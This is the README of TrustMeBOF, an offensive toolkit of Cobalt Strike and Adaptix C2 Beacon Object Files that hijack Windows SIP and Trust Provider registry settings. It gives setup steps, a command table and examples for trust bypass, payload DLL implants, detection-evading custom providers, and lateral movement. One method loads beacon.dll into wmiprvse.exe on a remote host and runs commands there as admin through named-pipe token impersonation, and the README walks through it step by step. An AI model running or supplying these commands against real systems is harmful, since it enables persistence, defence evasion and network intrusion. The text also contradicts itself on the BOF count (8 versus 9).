# TrustMeBOF

Beacon Object Files for [TrustMeBro](https://github.com/KriyosArcane/TrustMeBro). 8 BOFs for Cobalt Strike and Adaptix C2.

## Setup

```bash
git clone https://github.com/KriyosArcane/TrustMeBOF.git
cd TrustMeBOF
./setup.sh
```

The setup script checks for `x86_64-w64-mingw32-gcc`, builds all 8 BOFs, and prints the load path for your C2. Pre-compiled .o files are included in `bin/` if you want to skip the build entirely.

## Structure

```
TrustMeBOF/
├── include/
│   ├── beacon.h                Cobalt Strike BOF API
│   └── tmb_bof.h               Shared header
├── src/                         8 BOF source files
├── bin/                         Compiled .o files (ready to load)
├── cna/tmb.cna                  Cobalt Strike aggressor script
├── axscript/tmb.axs             Adaptix C2 extension
├── Makefile
├── setup.sh
└── README.md
```

## Commands

> **Log out and log back in** after any registry write. SIP and Trust Provider values are cached per-process.

| Command | What it does |
|---|---|
| `tmb_probe` | CI flag recon (HVCI, test-signing, SAC). No writes. No admin. |
| `tmb_finalpolicy [--clean]` | FinalPolicy hijack. System-wide trust bypass. |
| `tmb_sip_hijack [--sip-types pe,ps1,msi] [--all-sips] [--sac] [--clean]` | SIP persistence for selected file types. |
| `tmb_wow64_hijack [--sip-types all] [--clean]` | WOW6432Node-only SIP hijack. 64-bit registry stays clean. |
| `tmb_custom_provider {GUID} [--clean]` | Custom action GUID with SoftpubCleanup. Evades known-GUID detection. |
| `tmb_sip_exec install --dll <path> --guid <alias>` | Install payload DLL on SIP execution surface. |
| `tmb_sip_exec remove --guid <alias>` | Remove SIP execution surface implant. |
| `tmb_sipexec_jump <target> <dll> [opts]` | **Lateral movement** via FinalPolicy hijack. DLL loads in wmiprvse.exe. |
| `tmb_sipexec_exec <target> <cmd> [opts]` | **Remote exec** via FinalPolicy hijack + named pipe impersonation. |
| `tmb_clean --sip / --finalpolicy / --all` | Remove all persistence artifacts. |
| `tmb_formatghost --oid <OID> --dll <path> [--clean]` | CryptDllFormatObject OID persistence. Analyst-triggered. |

GUID aliases: `pe`, `ps1`, `jscript`, `vbscript`, `wsf`, `cab`, `catalog`, `appx`, `appx-bundle`, `msi`, `ctl`, `esd`, `sac`

## Examples

```
tmb_probe
tmb_finalpolicy
tmb_finalpolicy --clean
tmb_sip_hijack --sip-types pe,ps1,msi
tmb_sip_hijack --all-sips --sac
tmb_sip_hijack --clean
tmb_wow64_hijack --sip-types all
tmb_custom_provider {GUID}
tmb_custom_provider --clean {GUID}
tmb_sip_exec install --dll C:\Temp\implant.dll --guid pe
tmb_sip_exec remove --guid pe
tmb_clean --all
tmb_formatghost --oid 1.3.6.1.4.1.311.99.1 --dll C:\Temp\handler.dll
tmb_formatghost --oid 1.3.6.1.4.1.311.99.1 --clean

# SIPExec lateral movement (NEW)
tmb_sipexec_jump 10.0.0.5 C:\Temp\beacon.dll
tmb_sipexec_jump 10.0.0.5 C:\Temp\beacon.dll --guid driver --share C$
tmb_sipexec_jump 10.0.0.5 \\10.0.0.1\share\beacon.dll --no-cleanup
tmb_sipexec_exec 10.0.0.5 whoami /all
tmb_sipexec_exec 10.0.0.5 "net user /domain" --guid driver
tmb_sipexec_exec 10.0.0.5 whoami --dll C:\custom_payload.dll
tmb_sipexec_exec 10.0.0.5 whoami --unc \\10.0.0.1\share\payload.dll
```

## SIPExec Lateral Movement

Remote command execution and session spawning via WinVerifyTrust FinalPolicy registry hijack. No new process created — code runs inside `wmiprvse.exe`.

**How it works:**
1. Upload payload DLL to target (or point to UNC path)
2. Hijack `FinalPolicy\{GUID}\$DLL` → payload path via remote registry
3. Trigger WMI query (`Win32_PnPSignedDriver`) → wmiprvse calls WinVerifyTrust → loads payload
4. (exec mode) Connect to named pipe in wmiprvse → run commands as admin via token impersonation
5. Restore registry + delete DLL

**Requirements:**
- Admin on target (for remote registry + SMB write to ADMIN$)
- Use `make_token` or `steal_token` first to set appropriate credentials
- RemoteRegistry service running on target (default on most Windows)
- Port 445 (SMB) + 135 (WMI DCOM) reachable

**MITRE:** T1553.003 (SIP/Trust Provider Hijacking) + T1047 (WMI)

## Manual Build

```bash
make          # build all 9 BOFs
make clean    # remove compiled objects
```

## License

MIT License. See [LICENSE](LICENSE).

Part of the [TrustMeBro](https://github.com/KriyosArcane/TrustMeBro) toolkit.
